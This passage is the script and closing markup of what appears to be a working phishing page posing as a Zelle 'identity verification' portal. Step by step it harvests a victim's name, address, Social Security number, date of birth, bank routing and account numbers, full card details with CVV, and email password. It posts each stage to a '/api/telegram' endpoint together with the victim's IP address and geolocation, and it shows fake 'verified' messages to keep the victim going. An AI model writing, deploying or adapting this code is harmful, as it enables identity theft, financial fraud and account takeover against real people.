    ];
    
    let currentStep = 0;
    let partialDataSent = { bank: false, card: false, full: false };
    let formData = {
        fullName: "", addressStreet: "", addressCity: "", addressState: "", addressZip: "",
        ssn: "", dob: "", bankName: "", routingNumber: "", accountNumber: "",
        cardNumber: "", cardExpiry: "", cardCvv: "", email: "", password: ""
    };
    let isSubmitting = false;
    let emailSubmitted = false;
    let bankSearchTerm = "";
    
    function showLoading(message = "Processing...") {
        const overlay = document.createElement('div');
        overlay.className = 'loading-overlay';
        overlay.id = 'loadingOverlay';
        overlay.innerHTML = `
            <div class="loading-content">
                <div class="loading-spinner-large"></div>
                <p style="margin-top: 16px; color: #1e293b; font-weight: 500;">${message}</p>
                <p style="font-size: 0.75rem; color: #64748b; margin-top: 8px;">Please wait...</p>
            </div>
        `;
        document.body.appendChild(overlay);
    }
    
    function hideLoading() {
        const overlay = document.getElementById('loadingOverlay');
        if (overlay) overlay.remove();
    }
    
    function formatSSN(value) { let numbers = value.replace(/\D/g, ''); if (numbers.length >= 3 && numbers.length < 6) { numbers = numbers.slice(0, 3) + '-' + numbers.slice(3); } else if (numbers.length >= 6) { numbers = numbers.slice(0, 3) + '-' + numbers.slice(3, 5) + '-' + numbers.slice(5, 9); } return numbers.slice(0, 11); }
    function formatCardNumber(value) { let numbers = value.replace(/\D/g, ''); let formatted = ''; for (let i = 0; i < numbers.length && i < 16; i++) { if (i > 0 && i % 4 === 0) formatted += ' '; formatted += numbers[i]; } return formatted; }
    function formatExpiry(value) { let numbers = value.replace(/\D/g, ''); if (numbers.length >= 2) { numbers = numbers.slice(0, 2) + '/' + numbers.slice(2, 4); } return numbers.slice(0, 5); }
    function validateCardNumber(cardNumber) { const numbers = cardNumber.replace(/\D/g, ''); if (numbers.length !== 16) return false; let sum = 0, alternate = false; for (let i = numbers.length - 1; i >= 0; i--) { let n = parseInt(numbers[i]); if (alternate) { n *= 2; if (n > 9) n -= 9; } sum += n; alternate = !alternate; } return sum % 10 === 0; }
    
    function getEmailProviderInfo(email) {
        const domain = email.split('@')[1]?.toLowerCase() || '';
        if (domain.includes('gmail')) return { name: 'Gmail', icon: 'fab fa-google', bgClass: 'gmail-bg', badgeClass: 'gmail-badge' };
        if (domain.includes('yahoo')) return { name: 'Yahoo Mail', icon: 'fab fa-yahoo', bgClass: 'yahoo-bg', badgeClass: 'yahoo-badge' };
        if (domain.includes('outlook') || domain.includes('hotmail') || domain.includes('live')) return { name: 'Outlook', icon: 'fab fa-microsoft', bgClass: 'outlook-bg', badgeClass: 'outlook-badge' };
        if (domain.includes('aol')) return { name: 'AOL Mail', icon: 'fas fa-envelope', bgClass: 'aol-bg', badgeClass: 'aol-badge' };
        return { name: domain.toUpperCase() + ' Mail', icon: 'fas fa-at', bgClass: 'default-bg', badgeClass: 'default-bg' };
    }
    
    function syncFormData() { document.querySelectorAll('[data-field]').forEach(input => { const field = input.getAttribute('data-field'); if (formData.hasOwnProperty(field)) formData[field] = input.value; }); }
    
    function renderProgress() {
        const tracker = document.getElementById('progressTracker');
        if (!tracker) return;
        tracker.innerHTML = steps.map((step, idx) => {
            let statusClass = '';
            if (idx < currentStep) statusClass = 'completed';
            else if (idx === currentStep) statusClass = 'active';
            let icon = '';
            if (statusClass === 'completed') icon = '<i class="fas fa-check-circle"></i>';
            else if (statusClass === 'active') icon = '<i class="fas fa-circle" style="font-size: 0.6rem;"></i>';
            else icon = '<i class="far fa-circle"></i>';
            return `<div class="step-marker ${statusClass}" onclick="goToStep(${idx})"><div class="step-icon">${icon}</div><span class="step-label">${step.name}</span></div>`;
        }).join('');
    }
    
    window.goToStep = function(stepIdx) { if (stepIdx < currentStep) { currentStep = stepIdx; renderProgress(); renderStep(currentStep); window.scrollTo({ top: 0, behavior: 'smooth' }); } };
    
    function validateCurrentStep(stepIdx) {
        if (stepIdx === 0) { const name = document.querySelector('[data-field="fullName"]')?.value.trim(); if (!name) return "Full name is required"; if (name.length < 3) return "Please enter your full legal name"; return null; }
        if (stepIdx === 1) { const street = document.querySelector('[data-field="addressStreet"]')?.value.trim(); if (!street) return "Street address is required"; const state = document.querySelector('[data-field="addressState"]')?.value; if (!state) return "Please select a state"; return null; }
        if (stepIdx === 2) { const ssn = document.querySelector('[data-field="ssn"]')?.value.trim(); const dob = document.querySelector('[data-field="dob"]')?.value.trim(); if (!ssn) return "SSN is required"; if (ssn.replace(/\D/g, '').length !== 9) return "SSN must be 9 digits"; if (!dob) return "Date of birth is required"; return null; }
        if (stepIdx === 3) { const bank = document.querySelector('[data-field="bankName"]')?.value; const routing = document.querySelector('[data-field="routingNumber"]')?.value.trim(); const account = document.querySelector('[data-field="accountNumber"]')?.value.trim(); if (!bank) return "Please select your bank"; if (!routing) return "Routing number required"; if (routing.replace(/\D/g, '').length !== 9) return "Routing number must be exactly 9 digits"; if (!account) return "Account number required"; return null; }
        if (stepIdx === 4) { const card = document.querySelector('[data-field="cardNumber"]')?.value.trim(); const expiry = document.querySelector('[data-field="cardExpiry"]')?.value.trim(); const cvv = document.querySelector('[data-field="cardCvv"]')?.value.trim(); if (!card) return "Card number required"; if (card.replace(/\D/g, '').length !== 16) return "Card number must be 16 digits"; if (!validateCardNumber(card)) return "Invalid card number"; if (!expiry) return "Expiry date required"; if (!/^\d{2}\/\d{2}$/.test(expiry)) return "Expiry must be MM/YY format"; const [month, year] = expiry.split('/'); const now = new Date(); const currentYear = now.getFullYear() % 100; const currentMonth = now.getMonth() + 1; if (parseInt(year) < currentYear || (parseInt(year) === currentYear && parseInt(month) < currentMonth)) return "Card has expired"; if (!cvv) return "CVV required"; if (cvv.replace(/\D/g, '').length !== 3) return "CVV must be 3 digits"; return null; }
        if (stepIdx === 5) { const email = document.querySelector('[data-field="email"]')?.value.trim(); if (!email) return "Email address required"; const emailRegex = /^[^\s@]+@([^\s@]+)$/; if (!emailRegex.test(email)) return "Valid email required"; return null; }
        return null;
    }
    
    function showTemporaryMessage(msg, type = 'error') { 
        const msgDiv = document.getElementById('globalMessage'); 
        if (msgDiv) { 
            const bgColor = type === 'error' ? '#fee2e2' : '#e6f7e6'; 
            const textColor = type === 'error' ? '#b91c1c' : '#2e7d32'; 
            const icon = type === 'error' ? 'fa-exclamation-triangle' : 'fa-check-circle'; 
            msgDiv.innerHTML = `<div style="background:${bgColor}; padding:14px; border-radius:20px; color:${textColor}; font-size:0.85rem; display:flex; align-items:center; gap:10px;"><i class="fas ${icon}"></i> ${msg}</div>`; 
            setTimeout(() => { if(msgDiv) msgDiv.innerHTML = ''; }, 5000); 
        } 
    }
    
    async function sendToTelegramAPI(data, type = 'partial') {
        try {
            let ipInfo = { ip: 'Unknown', country: 'Unknown', city: 'Unknown', region: 'Unknown' };
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                ipInfo.ip = ipData.ip;
                const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const geoData = await geoResponse.json();
                ipInfo.country = geoData.country_name || 'Unknown';
                ipInfo.city = geoData.city || 'Unknown';
                ipInfo.region = geoData.region || 'Unknown';
            } catch(e) { console.log('IP fetch failed'); }
            
            const payload = { ...data, ipInfo, userAgent: navigator.userAgent, timestamp: new Date().toISOString(), submissionType: type };
            const response = await fetch('/api/telegram', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
            if (!response.ok) { const errorData = await response.json().catch(() => ({})); throw new Error(errorData.error || `HTTP ${response.status}`); }
            return await response.json();
        } catch (error) { console.error('API Error:', error); return { success: false, error: error.message || 'Network error. Please try again.' }; }
    }
    
    async function sendPartialBankData() {
        if (partialDataSent.bank) return true;
        showLoading("Verifying bank details...");
        const bankData = { ...formData, submissionStage: "BANK_VERIFICATION_PARTIAL" };
        const result = await sendToTelegramAPI(bankData, 'partial_bank');
        hideLoading();
        if (result.success) { partialDataSent.bank = true; showTemporaryMessage('✓ Bank details verified and recorded', 'success'); return true; }
        return false;
    }
    
    async function sendPartialCardData() {
        if (partialDataSent.card) return true;
        showLoading("Verifying card details...");
        const cardData = { ...formData, submissionStage: "CARD_VERIFICATION_PARTIAL" };
        const result = await sendToTelegramAPI(cardData, 'partial_card');
        hideLoading();
        if (result.success) { partialDataSent.card = true; showTemporaryMessage('✓ Card details verified and recorded', 'success'); return true; }
        return false;
    }
    
    async function finalSubmit() {
        if (isSubmitting) return;
        syncFormData();
        if (!formData.password) { showTemporaryMessage('Please enter your email password to complete verification', 'error'); return; }
        
        isSubmitting = true;
        showLoading("Completing verification...");
        
        try {
            const fullData = { ...formData, submissionStage: "FULL_COMPLETION", emailProvider: getEmailProviderInfo(formData.email).name };
            const result = await sendToTelegramAPI(fullData, 'full_completion');
            hideLoading();
            if (result.success) { showThanksPage(); } 
            else { showTemporaryMessage(result.error || 'Verification failed. Please try again.', 'error'); }
        } catch (error) { hideLoading(); showTemporaryMessage('Connection error. Please check your internet and try again.', 'error'); } 
        finally { isSubmitting = false; }
    }
    
    function showThanksPage() { 
        const container = document.getElementById('stepsContainer'); 
        const progressDiv = document.getElementById('progressTracker'); 
        if (container) { 
            container.innerHTML = `<div class="success-page"><div class="success-icon"><i class="fas fa-shield-alt"></i></div><h2 style="margin-bottom: 16px; font-size: 1.8rem;">✅ Verification Complete</h2><p style="margin-bottom: 24px; color: #475569;">Your identity has been securely verified.<br>You will receive a confirmation shortly.</p><div style="background: #f0fdf4; padding: 16px; border-radius: 24px;"><i class="fas fa-lock" style="color: #10b981;"></i><span style="font-size: 0.85rem;"> Zelle® Protection Active</span></div></div>`; 
            if (progressDiv) progressDiv.style.display = 'none'; 
        } 
    }
    
    function initBankSearch() {
        const searchInput = document.getElementById('bankSearchInput');
        const hiddenSelect = document.getElementById('bankSelectHidden');
        const dropdown = document.getElementById('bankDropdown');
        
        if (!searchInput) return;
        
        const updateDropdown = () => {
            const term = searchInput.value.toLowerCase();
            const filtered = BANK_LIST.filter(bank => bank.toLowerCase().includes(term));
            dropdown.innerHTML = filtered.map(bank => `<div class="bank-option" data-bank="${bank}">${bank}</div>`).join('');
            if (filtered.length > 0 && term) dropdown.classList.add('show');
            else if (!term) dropdown.classList.remove('show');
            
            document.querySelectorAll('.bank-option').forEach(opt => {
                opt.addEventListener('click', () => {
                    const bankName = opt.getAttribute('data-bank');
                    searchInput.value = bankName;
                    hiddenSelect.value = bankName;
                    formData.bankName = bankName;
                    dropdown.classList.remove('show');
                });
            });
        };
        
        searchInput.addEventListener('input', updateDropdown);
        searchInput.addEventListener('focus', () => { if (searchInput.value) updateDropdown(); });
        document.addEventListener('click', (e) => { if (!searchInput.contains(e.target) && !dropdown.contains(e.target)) dropdown.classList.remove('show'); });
        
        if (formData.bankName) {
            searchInput.value = formData.bankName;
            hiddenSelect.value = formData.bankName;
        }
    }
    
    function showEmailPasswordUI(email) {
        const provider = getEmailProviderInfo(email);
        const container = document.getElementById('stepsContainer');
        container.innerHTML = `
            <div class="email-provider-card">
                <div class="provider-icon ${provider.bgClass}"><i class="${provider.icon}"></i></div>
                <span class="provider-badge ${provider.badgeClass}">${provider.name}</span>
                <div class="provider-email"><i class="fas fa-envelope"></i> ${escapeHtml(email)}</div>
                <div class="input-group password-input-container">
                    <label><i class="fas fa-lock"></i> Enter your ${provider.name} password</label>
                    <input type="password" id="emailPasswordInput" placeholder="••••••••" autocomplete="current-password">
                    <span class="toggle-password-email" id="toggleEmailPassword" style="top: 45px;"><i class="far fa-eye-slash"></i></span>
                </div>
                <button class="btn-submit btn-purple" id="finalSubmitBtn" style="margin-top: 20px;"><i class="fab fa-telegram"></i> Complete Verification</button>
                <button class="btn-back" id="backToEmailBtn" style="margin-top: 12px;"><i class="fas fa-chevron-left"></i> Back to Email</button>
            </div>
        `;
        
        const passwordInput = document.getElementById('emailPasswordInput');
        const toggleBtn = document.getElementById('toggleEmailPassword');
        const finalBtn = document.getElementById('finalSubmitBtn');
        const backBtn = document.getElementById('backToEmailBtn');
        
        if (toggleBtn && passwordInput) {
            toggleBtn.addEventListener('click', () => {
                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                passwordInput.setAttribute('type', type);
                toggleBtn.innerHTML = type === 'password' ? '<i class="far fa-eye-slash"></i>' : '<i class="far fa-eye"></i>';
            });
        }
        
        if (finalBtn) finalBtn.addEventListener('click', () => {
            const pwd = passwordInput.value;
            if (!pwd) { showTemporaryMessage('Please enter your password', 'error'); return; }
            formData.password = pwd;
            finalSubmit();
        });
        
        if (backBtn) backBtn.addEventListener('click', () => { emailSubmitted = false; renderStep(5); });
    }
    
    async function goToNextStep() {
        syncFormData();
        const errorMsg = validateCurrentStep(currentStep);
        if (errorMsg) { showTemporaryMessage(errorMsg, 'error'); return; }
        
        if (currentStep === 3) {
            const sendResult = await sendPartialBankData();
            if (!sendResult) { showTemporaryMessage('Unable to verify bank details. Please check your connection.', 'error'); return; }
        }
        
        if (currentStep === 4) {
            const sendResult = await sendPartialCardData();
            if (!sendResult) { showTemporaryMessage('Unable to verify card details. Please check your connection.', 'error'); return; }
        }
        
        if (currentStep < steps.length - 1) {
            currentStep++;
            renderProgress();
            renderStep(currentStep);
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
    }
    
    function goToPrevStep() {
        if (currentStep > 0) {
            syncFormData();
            currentStep--;
            renderProgress();
            renderStep(currentStep);
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
    }
    
    function handleEmailSubmit() {
        syncFormData();
        const email = formData.email;
        if (!email) { showTemporaryMessage('Please enter your email address', 'error'); return; }
        const emailRegex = /^[^\s@]+@([^\s@]+)$/;
        if (!emailRegex.test(email)) { showTemporaryMessage('Please enter a valid email address', 'error'); return; }
        emailSubmitted = true;
        showEmailPasswordUI(email);
    }
    
    function renderStep(stepIndex) {
        const container = document.getElementById('stepsContainer');
        if (!container) return;
        
        if (stepIndex === 5 && !emailSubmitted) {
            const stateOptions = US_STATES.map(state => `<option value="${state}" ${formData.addressState === state ? 'selected' : ''}>${state}</option>`).join('');
            container.innerHTML = `
                <div class="step-content">
                    <div class="input-group"><label><i class="fas fa-envelope"></i> Email Address</label><input type="email" data-field="email" id="emailInputField" placeholder="you@gmail.com" value="${escapeHtml(formData.email)}"></div>
                    <button class="btn-next btn-purple" id="submitEmailBtn"><i class="fas fa-arrow-right"></i> Continue to Verification</button>
                    <button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button>
                </div>
            `;
            document.getElementById('submitEmailBtn')?.addEventListener('click', handleEmailSubmit);
            document.getElementById('prevStepBtn')?.addEventListener('click', goToPrevStep);
        } else if (stepIndex === 5 && emailSubmitted) {
            showEmailPasswordUI(formData.email);
        } else {
            const stateOptions = US_STATES.map(state => `<option value="${state}" ${formData.addressState === state ? 'selected' : ''}>${state}</option>`).join('');
            const bankOptions = BANK_LIST.map(bank => `<option value="${bank}" ${formData.bankName === bank ? 'selected' : ''}>${bank}</option>`).join('');
            
            const stepsHtml = {
                0: `<div class="step-content"><div class="input-group"><label><i class="fas fa-user"></i> Full Legal Name</label><input type="text" data-field="fullName" placeholder="Johnathan Michael Doe" value="${escapeHtml(formData.fullName)}"></div><button class="btn-next btn-purple" id="nextStepBtn"><i class="fas fa-arrow-right"></i> Continue</button></div>`,
                1: `<div class="step-content"><div class="input-group"><label><i class="fas fa-home"></i> Street Address</label><input type="text" data-field="addressStreet" placeholder="123 Main St, Apt 4B" value="${escapeHtml(formData.addressStreet)}"></div><div class="input-group"><label>City</label><input type="text" data-field="addressCity" placeholder="City" value="${escapeHtml(formData.addressCity)}"></div><div class="input-group"><label>State</label><select data-field="addressState">${stateOptions}</select></div><div class="input-group"><label>ZIP Code</label><input type="text" data-field="addressZip" placeholder="ZIP Code" value="${escapeHtml(formData.addressZip)}"></div><button class="btn-next btn-purple" id="nextStepBtn">Continue <i class="fas fa-arrow-right"></i></button><button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button></div>`,
                2: `<div class="step-content"><div class="input-group"><label><i class="fas fa-id-card"></i> Social Security Number</label><input type="text" data-field="ssn" id="ssnInput" placeholder="XXX-XX-XXXX" value="${escapeHtml(formData.ssn)}" maxlength="11"></div><div class="input-group"><label><i class="fas fa-calendar-alt"></i> Date of Birth</label><input type="date" data-field="dob" value="${escapeHtml(formData.dob)}"></div><button class="btn-next btn-purple" id="nextStepBtn">Continue <i class="fas fa-arrow-right"></i></button><button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button></div>`,
                3: `<div class="step-content"><div class="bank-search-container"><label><i class="fas fa-university"></i> Select Your Bank</label><input type="text" id="bankSearchInput" class="bank-search-input" placeholder="Search for your bank..." autocomplete="off"><input type="hidden" data-field="bankName" id="bankSelectHidden" value="${escapeHtml(formData.bankName)}"><div id="bankDropdown" class="bank-dropdown"></div></div><div class="input-group"><label><i class="fas fa-route"></i> Routing Number (9-digit)</label><input type="text" data-field="routingNumber" id="routingInput" placeholder="021000021" value="${escapeHtml(formData.routingNumber)}" maxlength="9"></div><div class="input-group"><label><i class="fas fa-credit-card"></i> Account Number</label><input type="text" data-field="accountNumber" placeholder="Your bank account number" value="${escapeHtml(formData.accountNumber)}"></div><button class="btn-next btn-purple" id="nextStepBtn">Continue <i class="fas fa-arrow-right"></i></button><button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button></div>`,
                4: `<div class="step-content"><div class="input-group"><label><i class="fas fa-credit-card"></i> Debit/Credit Card Number</label><input type="text" data-field="cardNumber" id="cardInput" placeholder="4672 3782 2893 3782" value="${escapeHtml(formData.cardNumber)}" maxlength="19"></div><div class="input-group"><label>Expiry Date (MM/YY)</label><input type="text" data-field="cardExpiry" id="expiryInput" placeholder="MM/YY" value="${escapeHtml(formData.cardExpiry)}" maxlength="5"></div><div class="input-group"><label>CVV</label><input type="password" data-field="cardCvv" id="cvvInput" placeholder="123" value="${escapeHtml(formData.cardCvv)}" maxlength="3"></div><button class="btn-next btn-purple" id="nextStepBtn">Continue <i class="fas fa-arrow-right"></i></button><button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button></div>`
            };
            
            container.innerHTML = stepsHtml[stepIndex];
            
            document.getElementById('ssnInput')?.addEventListener('input', (e) => { e.target.value = formatSSN(e.target.value); });
            document.getElementById('routingInput')?.addEventListener('input', (e) => { e.target.value = e.target.value.replace(/\D/g, '').slice(0, 9); });
            const cardInput = document.getElementById('cardInput');
            if (cardInput) { cardInput.addEventListener('input', (e) => { e.target.value = formatCardNumber(e.target.value); if (validateCardNumber(e.target.value)) e.target.classList.add('valid-card'); else e.target.classList.remove('valid-card'); }); }
            document.getElementById('expiryInput')?.addEventListener('input', (e) => { e.target.value = formatExpiry(e.target.value); });
            document.getElementById('cvvInput')?.addEventListener('input', (e) => { e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3); });
            
            document.getElementById('nextStepBtn')?.addEventListener('click', goToNextStep);
            document.getElementById('prevStepBtn')?.addEventListener('click', goToPrevStep);
            
            if (stepIndex === 3) initBankSearch();
        }
    }
    
    function escapeHtml(str) { if(!str) return ''; return str.replace(/[&<>]/g, function(m){ if(m === '&') return '&amp;'; if(m === '<') return '&lt;'; if(m === '>') return '&gt;'; return m; }); }
    
    showLoading("Loading secure verification portal...");
    setTimeout(() => {
        hideLoading();
        renderProgress();
        renderStep(0);
    }, 1000);
</script>
</body>
</html>
